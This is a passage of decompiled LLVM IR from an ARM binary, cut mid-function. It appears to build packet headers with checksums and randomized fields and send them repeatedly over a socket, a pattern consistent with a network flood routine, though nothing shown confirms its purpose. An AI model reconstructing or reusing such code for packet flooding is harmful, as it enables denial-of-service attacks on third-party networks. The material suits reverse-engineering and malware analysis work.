  %v0_9a08 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9a08, label %bb102, label %bb101

bb101:                                            ; preds = %bb100
  %v1_9a08 = load i32, i32* %r3.global-to-local, align 4
  %v2_9a08 = trunc i32 %v1_9a08 to i8
  %v3_9a08 = load i32, i32* @r5, align 4
  %v4_9a08 = add i32 %v3_9a08, 6
  %v5_9a08 = inttoptr i32 %v4_9a08 to i8*
  store i8 %v2_9a08, i8* %v5_9a08, align 1
  br label %bb102

bb102:                                            ; preds = %bb100, %bb101
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_9a10 = load i32, i32* %r1.global-to-local, align 4
  %v1_9a10 = trunc i32 %v0_9a10 to i8
  %v2_9a10 = load i32, i32* @r5, align 4
  %v3_9a10 = add i32 %v2_9a10, 5
  %v4_9a10 = inttoptr i32 %v3_9a10 to i8*
  store i8 %v1_9a10, i8* %v4_9a10, align 1
  %v0_9a14 = load i32, i32* %r2.global-to-local, align 4
  %v1_9a14 = trunc i32 %v0_9a14 to i8
  %v2_9a14 = load i32, i32* @r5, align 4
  %v3_9a14 = add i32 %v2_9a14, 8
  %v4_9a14 = inttoptr i32 %v3_9a14 to i8*
  store i8 %v1_9a14, i8* %v4_9a14, align 1
  %v0_9a18 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9a18, label %bb104, label %bb103

bb103:                                            ; preds = %bb102
  %v1_9a18 = load i32, i32* %ip.global-to-local, align 4
  %v2_9a18 = trunc i32 %v1_9a18 to i8
  %v3_9a18 = load i32, i32* @r5, align 4
  %v4_9a18 = add i32 %v3_9a18, 7
  %v5_9a18 = inttoptr i32 %v4_9a18 to i8*
  store i8 %v2_9a18, i8* %v5_9a18, align 1
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v0_9a1c = load i32, i32* %r3.global-to-local, align 4
  %v1_9a1c = trunc i32 %v0_9a1c to i8
  %v2_9a1c = load i32, i32* @r5, align 4
  %v3_9a1c = add i32 %v2_9a1c, 9
  %v4_9a1c = inttoptr i32 %v3_9a1c to i8*
  store i8 %v1_9a1c, i8* %v4_9a1c, align 1
  %v0_9a20 = call i32 @function_e978()
  store i32 %v0_9a20, i32* %r0.global-to-local, align 4
  store i32 %v1_97c8, i32* %r1.global-to-local, align 4
  store i1 %v2_9a2c, i1* %cpsr_z.global-to-local, align 1
  %v1_9a30 = sub i32 1023, %v0_9a20
  store i32 %v1_9a30, i32* %r3.global-to-local, align 4
  br i1 %v2_9a2c, label %.thread21, label %.thread22

.thread21:                                        ; preds = %bb104
  %v2_9a38 = load i32, i32* @r5, align 4
  %v3_9a38 = add i32 %v2_9a38, 16
  %v4_9a38 = inttoptr i32 %v3_9a38 to i32*
  store i32 %v1_9a30, i32* %v4_9a38, align 4
  br label %bb105

.thread22:                                        ; preds = %bb104
  %v1_9a34 = load i32, i32* %r4.global-to-local, align 4
  %v2_9a34 = add i32 %v1_9a34, 16
  %v3_9a34 = inttoptr i32 %v2_9a34 to i32*
  %v4_9a34 = load i32, i32* %v3_9a34, align 4
  store i32 %v4_9a34, i32* %r3.global-to-local, align 4
  %v2_9a3c = load i32, i32* @r5, align 4
  %v3_9a3c = add i32 %v2_9a3c, 16
  %v4_9a3c = inttoptr i32 %v3_9a3c to i32*
  store i32 %v4_9a34, i32* %v4_9a3c, align 4
  br label %bb105

bb105:                                            ; preds = %.thread21, %.thread22
  store i32 %v4_9a40, i32* %r3.global-to-local, align 4
  %v0_9a44 = load i32, i32* %r4.global-to-local, align 4
  %v1_9a44 = add i32 %v0_9a44, 58
  store i32 %v1_9a44, i32* @r6, align 4
  %v1_9a48 = load i32, i32* @r5, align 4
  %v2_9a48 = add i32 %v1_9a48, 12
  %v3_9a48 = inttoptr i32 %v2_9a48 to i32*
  store i32 %v0_9a20, i32* %v3_9a48, align 4
  %v0_9a4c = load i32, i32* %r3.global-to-local, align 4
  %v1_9a4c = trunc i32 %v0_9a4c to i8
  %v2_9a4c = load i32, i32* @r6, align 4
  %v3_9a4c = add i32 %v2_9a4c, 1
  %v4_9a4c = inttoptr i32 %v3_9a4c to i8*
  store i8 %v1_9a4c, i8* %v4_9a4c, align 1
  %v3_9a50 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9a50, i32* %r3.global-to-local, align 4
  store i32 %v4_9a54, i32* %r2.global-to-local, align 4
  %v1_9a58 = add i32 %v3_9a50, 1
  store i32 %v1_9a58, i32* @r4, align 4
  store i32 %v4_9a5c, i32* %r1.global-to-local, align 4
  %v1_9a60 = load i32, i32* @fp, align 4
  %v9_9a60 = icmp eq i32 %v1_9a58, %v1_9a60
  store i1 %v9_9a60, i1* %cpsr_z.global-to-local, align 1
  %v2_9a64 = load i32, i32* @r6, align 4
  %v3_9a64 = add i32 %v2_9a64, 5
  %v4_9a64 = inttoptr i32 %v3_9a64 to i8*
  store i8 %v1_9a64, i8* %v4_9a64, align 1
  %v0_9a68 = load i32, i32* @r7, align 4
  %v1_9a68 = trunc i32 %v0_9a68 to i8
  %v2_9a68 = load i32, i32* @r6, align 4
  %v3_9a68 = inttoptr i32 %v2_9a68 to i8*
  store i8 %v1_9a68, i8* %v3_9a68, align 1
  %v0_9a6c = load i32, i32* %sl.global-to-local, align 4
  %v1_9a6c = trunc i32 %v0_9a6c to i8
  %v2_9a6c = load i32, i32* @r6, align 4
  %v3_9a6c = add i32 %v2_9a6c, 2
  %v4_9a6c = inttoptr i32 %v3_9a6c to i8*
  store i8 %v1_9a6c, i8* %v4_9a6c, align 1
  %v0_9a70 = load i32, i32* %r1.global-to-local, align 4
  %v1_9a70 = trunc i32 %v0_9a70 to i8
  %v2_9a70 = load i32, i32* @r6, align 4
  %v3_9a70 = add i32 %v2_9a70, 3
  %v4_9a70 = inttoptr i32 %v3_9a70 to i8*
  store i8 %v1_9a70, i8* %v4_9a70, align 1
  %v0_9a74 = load i32, i32* %r8.global-to-local, align 4
  %v1_9a74 = trunc i32 %v0_9a74 to i8
  %v2_9a74 = load i32, i32* @r6, align 4
  %v3_9a74 = add i32 %v2_9a74, 4
  %v4_9a74 = inttoptr i32 %v3_9a74 to i8*
  store i8 %v1_9a74, i8* %v4_9a74, align 1
  %v0_9a78 = load i32, i32* @r4, align 4
  store i32 %v0_9a78, i32* %stack_var_-40, align 4
  %v5_9a7c = icmp slt i32 %v1_9a58, %v1_9a60
  br i1 %v5_9a7c, label %dec_label_pc_98e0, label %dec_label_pc_9a80

dec_label_pc_9a80:                                ; preds = %bb105
  %v1_9a88 = add i32 %v5_9718, 8
  store i32 %v1_9a88, i32* %r2.global-to-local, align 4
  %v1_9a8c = add i32 %v5_9718, 66
  store i32 %v1_9a8c, i32* %r3.global-to-local, align 4
  %v0_9a98.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_9a98.preheader

dec_label_pc_9a98.preheader:                      ; preds = %dec_label_pc_9a80, %dec_label_pc_9d88
  %v0_9a98.pre = phi i32 [ %v0_9a98.pre.pre, %dec_label_pc_9a80 ], [ %v0_97dc, %dec_label_pc_9d88 ]
  %stack_var_-160.0.ph = phi i32 [ %v1_9a8c, %dec_label_pc_9a80 ], [ %v1_9d94, %dec_label_pc_9d88 ]
  %stack_var_-156.0.ph = phi i32 [ %v1_9a88, %dec_label_pc_9a80 ], [ %v1_9d90, %dec_label_pc_9d88 ]
  %v3_9ce8 = icmp eq i32 %v3_97d0, 65535
  %v2_9d58 = icmp eq i32 %v1_97c8, 0
  %v2_9b3c = ptrtoint i32* %stack_var_-44 to i32
  %v2_9b54 = ptrtoint i32* %stack_var_-48 to i32
  %v2_9b64 = ptrtoint i32* %stack_var_-52 to i32
  %v2_9b70 = ptrtoint i32* %stack_var_-50 to i32
  %v2_9b84 = icmp eq i32 %v1_9738, 0
  %v2_9ae0 = icmp eq i32 %v5_976c, -1
  %v7_9ae0 = icmp eq i32 %v5_976c, -1
  br label %dec_label_pc_9a98

dec_label_pc_9a98:                                ; preds = %dec_label_pc_9b8c, %dec_label_pc_9a98.preheader
  %v0_9a98 = phi i32 [ %v0_9a98.pre, %dec_label_pc_9a98.preheader ], [ %v1_9c50, %dec_label_pc_9b8c ]
  %v2_9a98 = icmp eq i32 %v0_9a98, 0
  store i1 %v2_9a98, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp106 = icmp slt i32 %v0_9a98, 1
  br label %dec_label_pc_9aa0

dec_label_pc_9aa0:                                ; preds = %dec_label_pc_9aa0, %dec_label_pc_9a98
  br i1 %tmp106, label %dec_label_pc_9aa0, label %dec_label_pc_9aa4

dec_label_pc_9aa4:                                ; preds = %dec_label_pc_9aa0
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  br label %dec_label_pc_9ab0

dec_label_pc_9ab0:                                ; preds = %dec_label_pc_9b8c, %dec_label_pc_9aa4
  %v1_9ac4 = phi i32 [ %v1_9c4c, %dec_label_pc_9b8c ], [ 0, %dec_label_pc_9aa4 ]
  %v5_9ab4 = mul i32 %v1_9ac4, 24
  %v1_9ab8 = load i32, i32* @sb, align 4
  %v2_9ab8 = add i32 %v1_9ab8, %v5_9ab4
  store i32 %v2_9ab8, i32* %r3.global-to-local, align 4
  store i32 %v2_964c, i32* %r1.global-to-local, align 4
  %v1_9ac0 = add i32 %v2_9ab8, 20
  %v2_9ac0 = inttoptr i32 %v1_9ac0 to i8*
  %v3_9ac0 = load i8, i8* %v2_9ac0, align 1
  %v4_9ac0 = zext i8 %v3_9ac0 to i32
  store i32 %v4_9ac0, i32* %r2.global-to-local, align 4
  %v4_9ac4 = mul i32 %v1_9ac4, 4
  %v5_9ac4 = add i32 %v4_9ac4, %v2_964c
  %v6_9ac4 = inttoptr i32 %v5_9ac4 to i32*
  %v7_9ac4 = load i32, i32* %v6_9ac4, align 4
  store i32 %v7_9ac4, i32* @r5, align 4
  %v7_9ac8 = icmp eq i8 %v3_9ac0, 31
  store i1 %v7_9ac8, i1* %cpsr_z.global-to-local, align 1
  %v1_9acc = add i32 %v7_9ac4, 24
  store i32 %v1_9acc, i32* @r8, align 4
  %v1_9ad0 = add i32 %v7_9ac4, 38
  store i32 %v1_9ad0, i32* @r6, align 4
  %v1_9ad4 = add i32 %v7_9ac4, 58
  store i32 %v1_9ad4, i32* @r7, align 4
  %tmp117 = icmp ult i8 %v3_9ac0, 32
  br i1 %tmp117, label %dec_label_pc_9c70, label %dec_label_pc_9adc

dec_label_pc_9adc:                                ; preds = %dec_label_pc_9ab0
  store i32 %v5_976c, i32* %r2.global-to-local, align 4
  store i1 %v7_9ae0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9ae0, label %dec_label_pc_9cd8, label %dec_label_pc_9ae8

dec_label_pc_9ae8:                                ; preds = %dec_label_pc_9c70, %dec_label_pc_9adc
  store i32 %v3_97d0, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_9ce8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9ce8, label %dec_label_pc_9cf4, label %dec_label_pc_9afc

dec_label_pc_9afc:                                ; preds = %dec_label_pc_9cd8.dec_label_pc_9afc_crit_edge, %dec_label_pc_9ae8
  %v1_9b00 = phi i32 [ %v1_9b00.pre, %dec_label_pc_9cd8.dec_label_pc_9afc_crit_edge ], [ 65535, %dec_label_pc_9ae8 ]
  store i32 %v3_97d4, i32* %r1.global-to-local, align 4
  %v9_9b00 = icmp eq i32 %v3_97d4, %v1_9b00
  store i1 %v9_9b00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9b00, label %dec_label_pc_9d2c, label %dec_label_pc_9b08

dec_label_pc_9b08:                                ; preds = %dec_label_pc_9cf4.dec_label_pc_9b08_crit_edge, %dec_label_pc_9afc
  %v1_9b0c = phi i32 [ %v1_9b0c.pre, %dec_label_pc_9cf4.dec_label_pc_9b08_crit_edge ], [ %v1_9b00, %dec_label_pc_9afc ]
  store i32 %v3_97d8, i32* %r2.global-to-local, align 4
  %v9_9b0c = icmp eq i32 %v3_97d8, %v1_9b0c
  store i1 %v9_9b0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9b0c, label %dec_label_pc_9d48, label %dec_label_pc_9b14

dec_label_pc_9b14:                                ; preds = %dec_label_pc_9d2c, %dec_label_pc_9b08
  store i32 %v1_97c8, i32* %r3.global-to-local, align 4
  store i1 %v2_9d58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9d58, label %dec_label_pc_9d6c, label %.thread23

.thread23:                                        ; preds = %dec_label_pc_9b14
  %v1_9b1c = load i32, i32* @r5, align 4
  %v2_9b1c = add i32 %v1_9b1c, 16
  %v3_9b1c = inttoptr i32 %v2_9b1c to i32*
  %v4_9b1c = load i32, i32* %v3_9b1c, align 4
  store i32 %v4_9b1c, i32* %r3.global-to-local, align 4
  %v2_9b20 = load i32, i32* @r6, align 4
  %v3_9b20 = add i32 %v2_9b20, 16
  %v4_9b20 = inttoptr i32 %v3_9b20 to i32*
  store i32 %v4_9b1c, i32* %v4_9b20, align 4
  br label %dec_label_pc_9b28

dec_label_pc_9b28:                                ; preds = %bb109, %.thread23, %dec_label_pc_9d6c
  %v0_9b28 = call i32 @function_e978()
  store i32 %v0_9b28, i32* %r0.global-to-local, align 4
  store i32 %v0_9b28, i32* %stack_var_-44, align 4
  %v0_9b30 = call i32 @function_e978()
  store i32 %v0_9b30, i32* %r0.global-to-local, align 4
  store i32 %v0_9b30, i32* %stack_var_-48, align 4
  %v0_9b38 = call i32 @function_e978()
  store i32 %v2_9b3c, i32* %r1.global-to-local, align 4
  store i32 %v0_9b38, i32* %stack_var_-52, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_9b48 = load i32, i32* @r8, align 4
  store i32 %v0_9b48, i32* %r0.global-to-local, align 4
  %v3_9b4c = call i32 @function_11268(i32 %v0_9b48, i32 %v2_9b3c, i32 4)
  %v0_9b50 = load i32, i32* @r8, align 4
  %v1_9b50 = add i32 %v0_9b50, 6
  store i32 %v1_9b50, i32* %r0.global-to-local, align 4
  store i32 %v2_9b54, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_9b5c = call i32 @function_11268(i32 %v1_9b50, i32 %v2_9b54, i32 4)
  %v0_9b60 = load i32, i32* @r8, align 4
  %v1_9b60 = add i32 %v0_9b60, 4
  store i32 %v1_9b60, i32* %r0.global-to-local, align 4
  store i32 %v2_9b64, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_9b6c = call i32 @function_11268(i32 %v1_9b60, i32 %v2_9b64, i32 2)
  store i32 %v2_9b70, i32* %r1.global-to-local, align 4
  %v0_9b74 = load i32, i32* @r8, align 4
  %v1_9b74 = add i32 %v0_9b74, 10
  store i32 %v1_9b74, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_9b7c = call i32 @function_11268(i32 %v1_9b74, i32 %v2_9b70, i32 2)
  store i32 %v3_9b7c, i32* %r0.global-to-local, align 4
  store i32 %v1_9738, i32* %r1.global-to-local, align 4
  store i1 %v2_9b84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9b84, label %dec_label_pc_9b8c, label %dec_label_pc_9d78

dec_label_pc_9b8c:                                ; preds = %dec_label_pc_9b28, %dec_label_pc_9d78
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9b90 = load i32, i32* @sl, align 4
  %v1_9b90 = trunc i32 %v0_9b90 to i8
  %v2_9b90 = load i32, i32* @r5, align 4
  %v3_9b90 = add i32 %v2_9b90, 10
  %v4_9b90 = inttoptr i32 %v3_9b90 to i8*
  store i8 %v1_9b90, i8* %v4_9b90, align 1
  %v0_9b94 = load i32, i32* @sl, align 4
  %v1_9b94 = trunc i32 %v0_9b94 to i8
  %v2_9b94 = load i32, i32* @r5, align 4
  %v3_9b94 = add i32 %v2_9b94, 11
  %v4_9b94 = inttoptr i32 %v3_9b94 to i8*
  store i8 %v1_9b94, i8* %v4_9b94, align 1
  %v0_9b98 = load i32, i32* @r5, align 4
  store i32 %v0_9b98, i32* @r0, align 4
  %v2_9b9c = call i32 @function_d0b8(i32 %v0_9b98, i32 20)
  %v3_9b9c = trunc i32 %v2_9b9c to i8
  %v4_9ba0 = sdiv i32 %v2_9b9c, 256
  store i32 %v4_9ba0, i32* %r3.global-to-local, align 4
  %v1_9ba4 = trunc i32 %v4_9ba0 to i8
  %v2_9ba4 = load i32, i32* @r5, align 4
  %v3_9ba4 = add i32 %v2_9ba4, 11
  %v4_9ba4 = inttoptr i32 %v3_9ba4 to i8*
  store i8 %v1_9ba4, i8* %v4_9ba4, align 1
  %v3_9ba8 = load i32, i32* @r5, align 4
  %v4_9ba8 = add i32 %v3_9ba8, 10
  %v5_9ba8 = inttoptr i32 %v4_9ba8 to i8*
  store i8 %v3_9b9c, i8* %v5_9ba8, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9bb0 = load i32, i32* @sl, align 4
  %v1_9bb0 = trunc i32 %v0_9bb0 to i8
  %v2_9bb0 = load i32, i32* @r6, align 4
  %v3_9bb0 = add i32 %v2_9bb0, 10
  %v4_9bb0 = inttoptr i32 %v3_9bb0 to i8*
  store i8 %v1_9bb0, i8* %v4_9bb0, align 1
  %v0_9bb4 = load i32, i32* @sl, align 4
  %v1_9bb4 = trunc i32 %v0_9bb4 to i8
  %v2_9bb4 = load i32, i32* @r6, align 4
  %v3_9bb4 = add i32 %v2_9bb4, 11
  %v4_9bb4 = inttoptr i32 %v3_9bb4 to i8*
  store i8 %v1_9bb4, i8* %v4_9bb4, align 1
  %v0_9bb8 = load i32, i32* @r6, align 4
  store i32 %v0_9bb8, i32* @r0, align 4
  %v2_9bbc = call i32 @function_d0b8(i32 %v0_9bb8, i32 20)
  %v3_9bbc = trunc i32 %v2_9bbc to i8
  store i32 %v2_9bbc, i32* %r0.global-to-local, align 4
  %v4_9bc0 = sdiv i32 %v2_9bbc, 256
  store i32 %v4_9bc0, i32* %r3.global-to-local, align 4
  %v3_9bc4 = load i32, i32* @r6, align 4
  %v4_9bc4 = add i32 %v3_9bc4, 10
  %v5_9bc4 = inttoptr i32 %v4_9bc4 to i8*
  store i8 %v3_9bbc, i8* %v5_9bc4, align 1
  %v0_9bc8 = load i32, i32* %r3.global-to-local, align 4
  %v1_9bc8 = trunc i32 %v0_9bc8 to i8
  %v2_9bc8 = load i32, i32* @r6, align 4
  %v3_9bc8 = add i32 %v2_9bc8, 11
  %v4_9bc8 = inttoptr i32 %v3_9bc8 to i8*
  store i8 %v1_9bc8, i8* %v4_9bc8, align 1
  %v0_9bcc = load i32, i32* @r7, align 4
  %v1_9bcc = add i32 %v0_9bcc, 4
  %v2_9bcc = inttoptr i32 %v1_9bcc to i8*
  %v3_9bcc = load i8, i8* %v2_9bcc, align 1
  %v4_9bcc = zext i8 %v3_9bcc to i32
  store i32 %v4_9bcc, i32* %r3.global-to-local, align 4
  %v1_9bd0 = add i32 %v0_9bcc, 5
  %v2_9bd0 = inttoptr i32 %v1_9bd0 to i8*
  %v3_9bd0 = load i8, i8* %v2_9bd0, align 1
  %v4_9bd0 = zext i8 %v3_9bd0 to i32
  store i32 %v0_9bcc, i32* @r1, align 4
  %v4_9bd8 = mul nuw nsw i32 %v4_9bd0, 256
  %v5_9bd8 = or i32 %v4_9bd8, %v4_9bcc
  store i32 %v5_9bd8, i32* %r2.global-to-local, align 4
  %v0_9bdc = load i32, i32* @sl, align 4
  %v1_9bdc = trunc i32 %v0_9bdc to i8
  %v3_9bdc = add i32 %v0_9bcc, 6
  %v4_9bdc = inttoptr i32 %v3_9bdc to i8*
  store i8 %v1_9bdc, i8* %v4_9bdc, align 1
  store i32 %stack_var_-156.0.ph, i32* %r3.global-to-local, align 4
  %v0_9be4 = load i32, i32* @sl, align 4
  %v1_9be4 = trunc i32 %v0_9be4 to i8
  %v2_9be4 = load i32, i32* @r7, align 4
  %v3_9be4 = add i32 %v2_9be4, 7
  %v4_9be4 = inttoptr i32 %v3_9be4 to i8*
  store i8 %v1_9be4, i8* %v4_9be4, align 1
  %v0_9be8 = load i32, i32* @r6, align 4
  store i32 %v0_9be8, i32* %r0.global-to-local, align 4
  %v4_9bec = call i32 @function_d114(i32 %v0_9be8, i32 %v0_9bcc, i32 %v5_9bd8, i32 %stack_var_-156.0.ph)
  %v5_9bec = trunc i32 %v4_9bec to i8
  store i32 %v4_9bec, i32* %r0.global-to-local, align 4
  %v3_9bf0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9bf0, i32* %r3.global-to-local, align 4
  %v3_9bf4 = mul i32 %v3_9bf0, 32
  store i32 %v3_9bf4, i32* %r2.global-to-local, align 4
  %v0_9bf8 = load i32, i32* @r5, align 4
  %v1_9bf8 = add i32 %v0_9bf8, 16
  %v2_9bf8 = inttoptr i32 %v1_9bf8 to i32*
  %v3_9bf8 = load i32, i32* %v2_9bf8, align 4
  store i32 %v3_9bf8, i32* %r1.global-to-local, align 4
  %v5_9bfc = mul i32 %v3_9bf0, 24
  store i32 %v5_9bfc, i32* %r2.global-to-local, align 4
  %v4_9c0042 = udiv i32 %v4_9bec, 256
  %v1_9c04 = trunc i32 %v4_9c0042 to i8
  %v2_9c04 = load i32, i32* @r7, align 4
  %v3_9c04 = add i32 %v2_9c04, 7
  %v4_9c04 = inttoptr i32 %v3_9c04 to i8*
  store i8 %v1_9c04, i8* %v4_9c04, align 1
  %v0_9c08 = load i32, i32* %r2.global-to-local, align 4
  %v1_9c08 = load i32, i32* @sb, align 4
  %v2_9c08 = add i32 %v1_9c08, %v0_9c08
  store i32 %v2_9c08, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_9c10 = load i32, i32* @r7, align 4
  %v4_9c10 = add i32 %v3_9c10, 6
  %v5_9c10 = inttoptr i32 %v4_9c10 to i8*
  store i8 %v5_9bec, i8* %v5_9c10, align 1
  %v0_9c14 = load i32, i32* %r1.global-to-local, align 4
  %v1_9c14 = load i32, i32* %lr.global-to-local, align 4
  %v2_9c14 = add i32 %v1_9c14, 4
  %v3_9c14 = inttoptr i32 %v2_9c14 to i32*
  store i32 %v0_9c14, i32* %v3_9c14, align 4
  %v0_9c18 = load i32, i32* %r3.global-to-local, align 4
  %v1_9c18 = trunc i32 %v0_9c18 to i8
  %v2_9c18 = load i32, i32* %r2.global-to-local, align 4
  %v3_9c18 = load i32, i32* @sb, align 4
  %v4_9c18 = add i32 %v3_9c18, %v2_9c18
  %v5_9c18 = inttoptr i32 %v4_9c18 to i8*
  store i8 %v1_9c18, i8* %v5_9c18, align 1
  %v0_9c1c = load i32, i32* @sl, align 4
  %v1_9c1c = trunc i32 %v0_9c1c to i8
  %v2_9c1c = load i32, i32* %lr.global-to-local, align 4
  %v3_9c1c = add i32 %v2_9c1c, 2
  %v4_9c1c = inttoptr i32 %v3_9c1c to i8*
  store i8 %v1_9c1c, i8* %v4_9c1c, align 1
  %v0_9c20 = load i32, i32* @sl, align 4
  %v1_9c20 = trunc i32 %v0_9c20 to i8
  %v2_9c20 = load i32, i32* %lr.global-to-local, align 4
  %v3_9c20 = add i32 %v2_9c20, 1
  %v4_9c20 = inttoptr i32 %v3_9c20 to i8*
  store i8 %v1_9c20, i8* %v4_9c20, align 1
  %v0_9c24 = load i32, i32* @sl, align 4
  %v1_9c24 = trunc i32 %v0_9c24 to i8
  %v2_9c24 = load i32, i32* %lr.global-to-local, align 4
  %v3_9c24 = add i32 %v2_9c24, 3
  %v4_9c24 = inttoptr i32 %v3_9c24 to i8*
  store i8 %v1_9c24, i8* %v4_9c24, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_9c30 = load i32, i32* @r5, align 4
  store i32 %v0_9c30, i32* %r1.global-to-local, align 4
  store i32 %v3_9780, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-160.0.ph, i32* %r2.global-to-local, align 4
  %v0_9c3c = load i32, i32* %lr.global-to-local, align 4
  %v6_9c44 = inttoptr i32 %v0_9c30 to i32*
  %v7_9c44 = call i32 @function_1237c(i32 %v3_9780, i32* %v6_9c44, i32 %stack_var_-160.0.ph, i32 16384, i32 %v0_9c3c, i32 16)
  %v3_9c48 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9c48, i32* %r3.global-to-local, align 4
  %v1_9c4c = add i32 %v3_9c48, 1
  store i32 %v1_9c4c, i32* %r0.global-to-local, align 4
  %v1_9c50 = load i32, i32* @fp, align 4
  %v9_9c50 = icmp eq i32 %v1_9c4c, %v1_9c50
  store i1 %v9_9c50, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9c4c, i32* %stack_var_-40, align 4
  %v6_9c58 = icmp slt i32 %v1_9c4c, %v1_9c50
  br i1 %v6_9c58, label %dec_label_pc_9ab0, label %dec_label_pc_9a98

dec_label_pc_9c60:                                ; preds = %dec_label_pc_9790
  store i32 %v3_9780, i32* %r0.global-to-local, align 4
  %v1_9c64 = call i32 @function_11af0(i32 %v3_9780)
  store i32 %v1_9c64, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9c68

dec_label_pc_9c68:                                ; preds = %dec_label_pc_962c, %dec_label_pc_9c60
  %v29_9c6c = phi i32 [ %v3_9780, %dec_label_pc_962c ], [ %v1_9c64, %dec_label_pc_9c60 ]
  store i32 %v3_962c, i32* %r4.global-to-local, align 4
  store i32 %v15_962c, i32* %r8.global-to-local, align 4
  store i32 %v21_962c, i32* %sl.global-to-local, align 4
  ret i32 %v29_9c6c

dec_label_pc_9c70:                                ; preds = %dec_label_pc_9ab0
  %v1_9c70 = add i32 %v2_9ab8, 16
  %v2_9c70 = inttoptr i32 %v1_9c70 to i32*
  %v3_9c70 = load i32, i32* %v2_9c70, align 4
  store i32 %v3_9c70, i32* %r4.global-to-local, align 4
  %v0_9c74 = call i32 @function_e978()
  store i32 %v0_9c74, i32* %r0.global-to-local, align 4
  %v3_9c78 = load i32, i32* %stack_var_-40, align 4
  %v5_9c80 = mul i32 %v3_9c78, 24
  %v0_9c84 = load i32, i32* %r4.global-to-local, align 4
  %v1_9c88 = load i32, i32* @sb, align 4
  %v2_9c88 = add i32 %v1_9c88, %v5_9c80
  store i32 %v2_9c88, i32* %r1.global-to-local, align 4
  %v1_9c8c = and i32 %v0_9c84, 65280
  store i32 %v1_9c8c, i32* %r3.global-to-local, align 4
  %v1_9c84 = udiv i32 %v0_9c84, 256
  %v3_9c90 = and i32 %v1_9c84, 65280
  store i32 %v3_9c90, i32* %r2.global-to-local, align 4
  %v3_9c94 = mul i32 %v0_9c84, 16777216
  store i32 %v3_9c94, i32* %ip.global-to-local, align 4
  %v1_9c98 = add i32 %v2_9c88, 20
  %v2_9c98 = inttoptr i32 %v1_9c98 to i8*
  %v3_9c98 = load i8, i8* %v2_9c98, align 1
  %v4_9c98 = zext i8 %v3_9c98 to i32
  store i32 %v4_9c98, i32* %lr.global-to-local, align 4
  %v4_9c9c = mul nuw nsw i32 %v1_9c8c, 256
  %v5_9c9c = or i32 %v4_9c9c, %v3_9c94
  store i32 %v5_9c9c, i32* %ip.global-to-local, align 4
  %v2_9ca4 = call i32 @llvm.bswap.i32(i32 %v0_9c84)
  %v7_9ca8 = lshr i32 %v0_9c74, %v4_9c98
  %v8_9ca8 = add i32 %v7_9ca8, %v2_9ca4
  %v3_9cb4 = mul i32 %v8_9ca8, 16777216
  %v1_9cb8 = and i32 %v8_9ca8, 65280
  store i32 %v1_9cb8, i32* %r0.global-to-local, align 4
  store i32 %v5_976c, i32* %r2.global-to-local, align 4
  %v4_9cc4 = mul nuw nsw i32 %v1_9cb8, 256
  %v5_9cc4 = or i32 %v4_9cc4, %v3_9cb4
  store i32 %v5_9cc4, i32* %r1.global-to-local, align 4
  %v2_9cc8 = call i32 @llvm.bswap.i32(i32 %v8_9ca8)
  store i32 %v2_9cc8, i32* %r3.global-to-local, align 4
  store i1 %v7_9ae0, i1* %cpsr_z.global-to-local, align 1
  %v1_9cd0 = load i32, i32* @r5, align 4
  %v2_9cd0 = add i32 %v1_9cd0, 16
  %v3_9cd0 = inttoptr i32 %v2_9cd0 to i32*
  store i32 %v2_9cc8, i32* %v3_9cd0, align 4
  br i1 %v2_9ae0, label %dec_label_pc_9cd8, label %dec_label_pc_9ae8

dec_label_pc_9cd8:                                ; preds = %dec_label_pc_9c70, %dec_label_pc_9adc
  %v0_9cd8 = call i32 @function_e978()
  store i32 %v0_9cd8, i32* %r0.global-to-local, align 4
  store i32 %v3_97d0, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_9ce8, i1* %cpsr_z.global-to-local, align 1
  %v1_9cec = load i32, i32* @r5, align 4
  %v2_9cec = add i32 %v1_9cec, 12
  %v3_9cec = inttoptr i32 %v2_9cec to i32*
  store i32 %v0_9cd8, i32* %v3_9cec, align 4
  br i1 %v3_9ce8, label %dec_label_pc_9cf4, label %dec_label_pc_9cd8.dec_label_pc_9afc_crit_edge

dec_label_pc_9cd8.dec_label_pc_9afc_crit_edge:    ; preds = %dec_label_pc_9cd8
  %v1_9b00.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9afc

dec_label_pc_9cf4:                                ; preds = %dec_label_pc_9cd8, %dec_label_pc_9ae8
  %v0_9cf4 = call i32 @function_e978()
  %v3_9cfc = urem i32 %v0_9cf4, 65536
  store i32 %v3_9cfc, i32* %r0.global-to-local, align 4
  %v1_9d04 = sub nsw i32 999, %v3_9cfc
  store i32 %v1_9d04, i32* %r2.global-to-local, align 4
